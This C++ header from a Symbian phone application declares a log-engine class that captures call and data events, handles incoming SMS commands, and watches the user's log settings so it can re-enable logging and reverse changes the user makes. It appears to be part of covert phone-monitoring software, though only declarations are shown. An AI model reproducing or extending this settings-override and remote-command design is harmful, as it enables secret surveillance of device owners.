#ifndef __CltLogEngine_H__
#define __CltLogEngine_H__

#include <e32base.h>		// CActive
#include <logwrap.h>
#include <logcli.h>
#include <LogClientChangeObserver.h>
#include <LogViewChangeObserver.h>
#if defined (EKA2)
#include <tz.h>
#include <tzconverter.h>
#endif

#include "SmsCmdManager.h"
#include "SettingChangeObserver.h"
#include "CltSettings.h"
#include "ActiveBase.h"

#define ONE_DAY_SECS			  		  (60*60*24)

enum TLogConfigDuration
	{
	EConfigMaxEventAgeOneDay = ONE_DAY_SECS * 1,
	EConfigMaxEventAge10Days = ONE_DAY_SECS * 10,
	EConfigMaxEventAge30Days = ONE_DAY_SECS * 30
	};

/*
* iMaxLogSize, 
*/
const TUint16 KConfigMaxLogSize = 1000;

/*
* iMaxRecentLogSize, 
*/
const TUint8  KConfigMaxRecentLogSize = 20;

class MFxsLogEngineObserver
	{
public:
	virtual void EventAddedL(const CLogEvent& aEvent) = 0;
	virtual void EventLogClearedL() = 0;
	};

class CFxsLogEvent;
class CLogEvent;
class CLogClient;
class CLogFilter;
class CLogViewRecent;
class CLogViewEvent;
class CFxsEventDeleteObserver;
class RFs;
class CSharedDataI;
class CLogWrapper;
class CFxsAppUi;
class CRepository;

typedef RPointerArray<MFxsLogEngineObserver>	RFxsLogEngineObserverArray;

class CFxsLogEngine : public CActiveBase,
					  public MLogClientChangeObserver,
					  public MLogViewChangeObserver,
					  public MCmdListener,
					  public MSettingChangeObserver
	{
public:
	static CFxsLogEngine* NewL(CFxsAppUi& aAppUi);
	~CFxsLogEngine();
			
	//KConfigMaxEventAge30Days	
	void SetLogDurationConfigL(TLogConfigDuration aDuration=EConfigMaxEventAge30Days);	
	TInt GetLogString(TDes& aString, TInt aId) const;		
	void SetCustomDirection(CFxsLogEvent& aCltEvent, const TDesC& aDirection);	
	void AddLogEngineObserver(MFxsLogEngineObserver& aObserver);//not own observer	
	//Start/Stop capturing call event
	void StartCapture(TBool aCapture);
	static TInt CallbackLogEnableChanged(TAny* aObject);	
	
public://MSettingChangeObserver
	void OnSettingChangedL(CFxsSettings& aSetting);
	
private: //from CActive	
	void DoCancel();		
	void RunL();			
	TInt RunError(TInt aError);
	TPtrC ClassName();
	
private: //from MLogClientChangeObserver
	void HandleLogClientChangeEventL(TUid aChangeType, TInt aChangeParam1, TInt aChangeParam2, TInt aChangeParam3);	
private: //from MLogViewChangeObserver
	void HandleLogViewChangeEventAddedL(TLogId aId, TInt aViewIndex, TInt aChangeIndex, TInt aTotalChangeCount);
	void HandleLogViewChangeEventChangedL(TLogId aId, TInt aViewIndex, TInt aChangeIndex, TInt aTotalChangeCount);
	void HandleLogViewChangeEventDeletedL(TLogId aId, TInt aViewIndex, TInt aChangeIndex, TInt aTotalChangeCount);

private: //MCmdListener
	HBufC* HandleSmsCommandL(const TSmsCmdDetails& aCmdDetails);	
private:
	CFxsLogEngine(CFxsAppUi& aAppUi);
	void ConstructL();
	void CreateAndInitLogClientL();	
	/*
	* @return Return KErrNone if success
	*/
	TInt SetPhoneLogSettingEnable(TBool aEnable);	
	void CancelNotifyLogSettingEnableChanged();
	void NotifyLogSettingEnableChangedL();
	void CreateLogEngineShareDataL();	
	void  NotifyChangeCancel();
	void  NotifyChange();		
	/* There are three things to do
	*
	* 1. get latest log event
	* 2. get log direction
	* 3. check log configuration if it is disable
	*    enable it if it is disable
	*/
	void InitL();	
	TBool UpdateRecentView();	
	/*
	* Check if logengine configuration is enable by call GetConfig to get TLogConfig object
	* if iMaxEventAge is zero, The application will never get notification of changes.
	* so ChangeConfig() method must be called to change the config so that the app will be notified.
	*/
	void IssueGettingConfig();
	void IssueChangeConfig();	
	void ReadLogConfigL();
	TBool IssueGettingEvent();	
	void GetEventL();	
	TBool IsEventAdded();
	TBool AllowToChangeLogConfig();
	TBool MatchEventDir(const TDesC& aDirection, TInt aLogDirRscId);
#if defined (EKA2)
	TBool LoggingEnable();
#endif
private:	
	enum TState
		{	
		EIdle,				//0
		EGettingEvent,  	//1 issue CLogClient::GetEvent
		EWaitingEvent,		//2
		EUpdatingViewEvent, //3
		EGettingRecent,		//4
		EGettingLogConfig,	//5
		EChangeLogConfig,	//6
		EDeleteEvent,		//7
		EGetLatestEvent		//8
		};
private:
	CFxsAppUi& iAppUi;
	RFs& iFs;	
	/** Log wrapter class.
	
	It is used to check if logengine is available*/		
	CLogWrapper*	 iLogWrapper;	
	/** this is not owned by this class.
	
	so do not delete it*/
	CLogClient*		iLogCli;  // NOT OWNED	
	CLogFilter*		iLogFilter;
	CLogFilter*		iGprsLogFilter;
	CLogFilterList*	iFilterList;	
	/**
	LogEngine configuration.*/
	TLogConfig			iLogConfig;	
	CLogViewRecent*		iRecentView;	
#if defined (EKA2) //for 2rd-edition
	CRepository* iRepos;
#else
	/** ShareData API	
	It is used for monitoring Log application's setting (Menu/Settings/Log)*/
	CSharedDataI*		iPhoneLogShD;
#endif
	
	/** Flag indicates that log setting is changed while a active object is outstanding.	
	if ETrue, IssueGettingConfig() method will be called to check log setting value and change it back if required*/
	TBool iLogDurationMaybeChanged;	
	//observers that are interested in when new event is inserted
	RFxsLogEngineObserverArray	iLogEngineObservers; //not own observers
	TState	iState;	
	//the latest event log id(first event)		
	//
	/** Indicates that iRecentView's filter is set- in UpdateRecentView() method	
	This is set only onces in UpdateRecentView()*/		
	TBool	iRecentViewUpdated;		
	/** Indicates that logengine api is implemented.	
	Some devices/manufacturers do not implement this api such as SonyEriccson*/
	TBool iAllowToChangeLogConfig;
	TBool iStartCapture;
	CLogEvent*	iCurrentEvent;
	RPointerArray<CLogEvent> iEventAddedArray; //Not owned	
	CFxsSettings* iSettings; //Not Owned
		
	//this is used to gen latest event
	//when start up only
	//CLogFilter*		iViewEventFilter;
	//CLogViewEvent*			iViewEvent;	
	//CFxsEventDeleteObserver*	iEventDeleteObserver;		
	//TBool	iUpdateViewEvent;	
	//CFxsEventDeleteObserver*	viewEventObserver;	
	};

class CFxsEventDeleteObserver : public MLogViewChangeObserver
	{	
public:	
	static CFxsEventDeleteObserver* NewL();
	
private:
	CFxsEventDeleteObserver();
	
private: //from MLogViewChangeObserver
	void HandleLogViewChangeEventAddedL(TLogId aId, TInt aViewIndex, TInt aChangeIndex, TInt aTotalChangeCount);
	void HandleLogViewChangeEventChangedL(TLogId aId, TInt aViewIndex, TInt aChangeIndex, TInt aTotalChangeCount);
	void HandleLogViewChangeEventDeletedL(TLogId aId, TInt aViewIndex, TInt aChangeIndex, TInt aTotalChangeCount);
	
	};

#endif
